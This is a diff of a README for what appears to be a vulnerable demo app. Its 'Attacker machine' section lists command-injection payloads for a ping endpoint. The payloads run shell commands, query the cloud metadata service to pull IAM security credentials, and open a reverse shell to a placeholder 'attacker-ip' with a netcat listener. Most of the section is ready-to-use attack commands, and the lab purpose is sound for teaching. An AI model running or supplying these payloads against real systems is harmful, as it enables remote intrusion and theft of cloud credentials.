@@ -25,13 +25,17 @@ sudo docker run -d -p 3000:3000 --name ssrf-demo-app ssrf-demo-app
 ```
 
 # Atacker machine
-## Setup
-- Run listener: `nc -lvp 4444`
 
-## Exploit
-Post to endpoint `curl 'https://<victim-id>/ping?host='`
-    - `8.8.8.8; ls -la`
-    - `8.8.8.8; curl -IL -s https://www.google.com`
-    - `8.8.8.8; curl -s 'http://169.254.169.254/latest/meta-data/'`
-    - `8.8.8.8; curl -s 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'`
-    - `8.8.8.8; bash -i >& /dev/tcp/attacker-ip/4444 0>&1`
+## Exploit 1
+Post to endpoint `curl 'https://<victim-id>:3000/ping?host='` or use UI at `https://<victim-id>/:3000`:
+- `8.8.8.8; ls -la`
+- `8.8.8.8; curl -IL -s https://www.google.com`
+- `8.8.8.8; curl -s 'http://169.254.169.254/latest/meta-data/'`
+- `8.8.8.8; curl -s 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'`
+- `8.8.8.8; curl -s 'http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2_read_only_role'`
+
+## Exploit 2
+Run local listener: `nc -lvp 4444`
+
+Post to endpoint `curl 'https://<victim-id>:3000/ping?host='` or use UI at `https://<victim-id>/:3000`:
+- `8.8.8.8; bash -i >& /dev/tcp/attacker-ip/4444 0>&1`
